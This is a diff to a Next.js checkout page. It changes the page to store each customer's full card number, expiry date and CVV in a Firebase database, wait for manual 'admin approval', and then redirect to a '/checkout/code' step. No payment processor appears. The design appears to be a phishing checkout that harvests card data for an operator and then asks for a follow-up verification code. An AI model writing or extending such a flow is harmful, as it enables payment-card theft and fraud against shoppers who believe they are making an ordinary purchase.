@@ -7,6 +7,8 @@ import Link from "next/link"
 import { useState, useEffect } from "react"
 import { useRouter } from "next/navigation"
 import { Loader2 } from "lucide-react"
+import { ref, set, onValue } from "firebase/database"
+import { db } from "@/lib/firebase"
 
 export default function CheckoutPage() {
   const { items, subtotal, count } = useCart()
@@ -15,24 +17,24 @@ export default function CheckoutPage() {
   const total = subtotal + shipping
 
   const [waiting, setWaiting] = useState(false)
+  const [orderId, setOrderId] = useState("")
   const [cardNumber, setCardNumber] = useState("")
   const [expiry, setExpiry] = useState("")
   const [cvv, setCvv] = useState("")
 
-  // Poll for admin approval
+  // Listen for admin approval via Firebase
   useEffect(() => {
-    if (!waiting) return
-    const interval = setInterval(() => {
-      try {
-        const order = JSON.parse(localStorage.getItem("alain_order") || "{}")
-        if (order.status === "approved") {
-          clearInterval(interval)
-          router.push("/checkout/code")
-        }
-      } catch {}
-    }, 1500)
-    return () => clearInterval(interval)
-  }, [waiting, router])
+    if (!waiting || !orderId) return
+    const orderRef = ref(db, `orders/${orderId}`)
+    const unsub = onValue(orderRef, (snap) => {
+      const data = snap.val()
+      if (data?.status === "approved") {
+        unsub()
+        router.push("/checkout/code")
+      }
+    })
+    return () => unsub()
+  }, [waiting, orderId, router])
 
   function handleCardNumber(e: React.ChangeEvent<HTMLInputElement>) {
     const digits = e.target.value.replace(/\D/g, "").slice(0, 16)
@@ -52,10 +54,11 @@ export default function CheckoutPage() {
     setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
   }
 
-  function handleSubmit(e: React.FormEvent) {
+  async function handleSubmit(e: React.FormEvent) {
     e.preventDefault()
+    const id = Date.now().toString()
     const order = {
-      id: Date.now().toString(),
+      id,
       status: "pending",
       cardNumber,
       expiry,
@@ -64,7 +67,9 @@ export default function CheckoutPage() {
       promoCode: null,
       createdAt: new Date().toISOString(),
     }
-    localStorage.setItem("alain_order", JSON.stringify(order))
+    await set(ref(db, `orders/${id}`), order)
+    localStorage.setItem("alain_current_order_id", id)
+    setOrderId(id)
     setWaiting(true)
   }
 
